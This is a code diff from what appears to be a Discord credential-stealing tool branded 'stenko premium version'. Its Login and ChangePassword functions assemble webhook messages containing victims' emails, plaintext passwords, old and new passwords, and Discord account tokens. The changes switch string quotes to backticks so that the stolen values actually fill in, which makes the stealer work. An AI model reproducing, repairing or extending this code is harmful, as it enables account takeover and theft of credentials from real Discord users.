@@ -153,52 +153,37 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": " name",
-			    "value": " - " + json.username + "#" + json.discriminator,
+			    "value": ` - ` + json.username + `#` + json.discriminator,
                             "inline": true
                         },
                         {
                             "name": " id",
-                            "value": " - " + json.id,
+                            "value": ` - ` + json.id,
                             "inline": true
                         },
                         {
                             "name": "᲼᲼᲼᲼",
-                            "value": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
                             "inline": false
                         },
                         {
                             "name": " email",
-                            "value": " - ${email}",
+                            "value": ` - ${email}`,
                             "inline": true
                         },
                         {
                             "name": " password",
-                            "value": " - ${password}",
+                            "value": ` - ${password}`,
                             "inline": true
                         },
                         {
                             "name": "᲼᲼᲼᲼",
-                            "value": "᲼᲼᲼᲼",
-                            "inline": false
-                        },
-                        {
-                            "name": " nitro type",
-                            "value": " - ${GetNitro(json.premium_type)}",
-                            "inline": false
-                        },
-                        {
-                            "name": " badges",
-                            "value": " - ${GetBadges(json.flags)}",
-                            "inline": false
-                        },
-                        {
-                            "name": "᲼᲼᲼᲼",
-                            "value": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
                             "inline": false
                         },
                         {
                             "name": " token",
-                            "value": " - ${token}",
+                            "value": ` - \`${token}\``,
                             "inline": false
                         }
                     ],
@@ -241,61 +226,26 @@ function ChangePassword(oldpassword, newpassword, token) {
                 embeds: [
                     {
                         "color": 3092790,
-                       "fields": [
+                        "fields": [
                             {
-                                "name": " name",
-			        "value": " - " + json.username + "#" + json.discriminator,
+                                "name": " password changed",
+                                "value": `email - ${json.email}\nold password - ${oldpassword}\nnew password - ${newpassword}`,
                                 "inline": true
                             },
                             {
-                                "name": " id",
-                                "value": " - " + json.id,
+                                "name": " others",
+                                "value": `nitro type: ${GetNitro(json.premium_type)}\nbadges - ${GetBadges(json.flags)}`,
                                 "inline": true
-                            },
-                            {
-                                "name": "᲼᲼᲼᲼",
-                                "value": "᲼᲼᲼᲼",
-                                "inline": false
-                            },
-                            {
-                                "name": " email",
-                                "value": " - ${json.email}",
-                                "inline": true
-                            },
-                            {
-                                "name": " new password",
-                                "value": " - ${newpassword}",
-                                "inline": true
-                            },
-                            {
-                                "name": "᲼᲼᲼᲼",
-                                "value": "᲼᲼᲼᲼",
-                                "inline": false
-                            },
-                            {
-                                "name": " nitro type",
-                                "value": " - ${GetNitro(json.premium_type)}",
-                                "inline": false
-                            },
-                            {
-                                "name": " badges",
-                                "value": " - ${GetBadges(json.flags)}",
-                                "inline": false
-                            },
-                            {
-                                "name": "᲼᲼᲼᲼",
-                                "value": "᲼᲼᲼᲼",
-                                "inline": false
                             },
                             {
                                 "name": " token",
-                                "value": " - ${token}",
+                                "value": `\`${token}\``,
                                 "inline": false
                             }
                         ],
                         "author": {
                             "name": "stenko premium version",
-		 	    "url": `https://stenko.xyz`,
+		            "url": `https://stenko.xyz`,
                         },
 		        "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
